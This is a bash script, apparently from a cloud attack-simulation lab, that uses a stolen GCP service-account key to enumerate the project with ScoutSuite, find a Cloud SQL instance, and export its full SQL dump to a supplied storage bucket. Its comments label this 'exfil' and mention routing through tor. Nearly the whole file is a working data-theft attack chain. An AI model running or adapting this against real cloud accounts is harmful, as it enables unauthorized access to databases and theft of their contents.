#!/bin/bash
SCRIPTNAME=gcpiam2cloudsql
LOGFILE=/tmp/$SCRIPTNAME.log
function log { 
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" && echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE 
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true

help(){
cat <<EOH
usage: $SCRIPTNAME [-h] [--bucket-url=BUCKET_URL]

-h                      print this message and exit
--bucket-url            the bucket url for sql export
EOH
    exit 1
}

for i in "$@"; do
  case $i in
    -h|--help)
        HELP="$${i#*=}"
        shift # past argument=value
        help
        ;;
    -b=*|--bucket-url=*)
        BUCKET_URL="$${i#*=}"
        shift # past argument=value
        ;;
    *)
      # unknown option
      ;;
  esac
done

if [ -z $BUCKET_URL ]; then
    log "required option --bucket-url not specified"
    help
fi

log "Downloading jq..."
if ! command -v jq; then curl -LJ -o /usr/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 /usr/bin/jq; fi

log "public ip: $(curl -s https://icanhazip.com)"

# gcp cred setup
export GOOGLE_APPLICATION_CREDENTIALS=~/.config/gcloud/credentials.json
gcloud auth activate-service-account --key-file ~/.config/gcloud/credentials.json | tee -a $LOGFILE
PROJECT=$(gcloud auth list --filter=status:ACTIVE --format="value(account)" | awk -F "@" '{ print $2 }' | sed 's/.iam.gserviceaccount.com//g')
USER=$(gcloud auth list --filter=status:ACTIVE --format="value(account)" | awk -F "@" '{ print $1 }')
DEPLOYMENT=$(echo $${USER##*-})

# cloud enumeration
scout gcp --service-account ~/.config/gcloud/credentials.json --report-dir /$SCRIPTNAME/scout-report --project-id=$PROJECT --no-browser 2>&1 | tee -a $LOGFILE 

# cloudsql exfil snapshot and export
SQL_INSTANCES=$(gcloud sql instances list --project=$PROJECT --format="json")
log "found sql instances: $${SQL_INSTANCES}"
SQL_INSTANCE=$(echo $SQL_INSTANCES | jq -r --arg i $DEPLOYMENT '.[] | select(.name | endswith($i)) | .name')
log "found target instance: $SQL_INSTANCE"
SQL_DETAILS=$(gcloud sql instances describe $SQL_INSTANCE --project=$PROJECT --format="json")
log "target instance details: $SQL_DETAILS"
SQL_PROJECT=$(echo $SQL_DETAILS | jq -r '.project')
log "target instance project: $SQL_PROJECT"
SQL_REGION=$(echo $SQL_DETAILS | jq -r '.region')
log "target instance region: $SQL_REGION"
# this must be retrieved outside the tor network :(
# BUCKETS=$(gcloud storage buckets list --project=$PROJECT --filter="location=$SQL_REGION" --format="json")
# BUCKET_URL=$(echo $BUCKETS | jq -r --arg i $DEPLOYMENT '.[] | select(.name | contains($i)) | .storage_url')
# gsutil ls -l $BUCKET_URL 2>&1 | tee -a $LOGFILE 
# BUCKET_URL="gs://db-backup-target-ab77012a-9e01/"
gcloud sql export sql --project=$PROJECT $SQL_INSTANCE "$${BUCKET_URL}$${SQL_INSTANCE}_dump.gz" 2>&1 | tee -a $LOGFILE 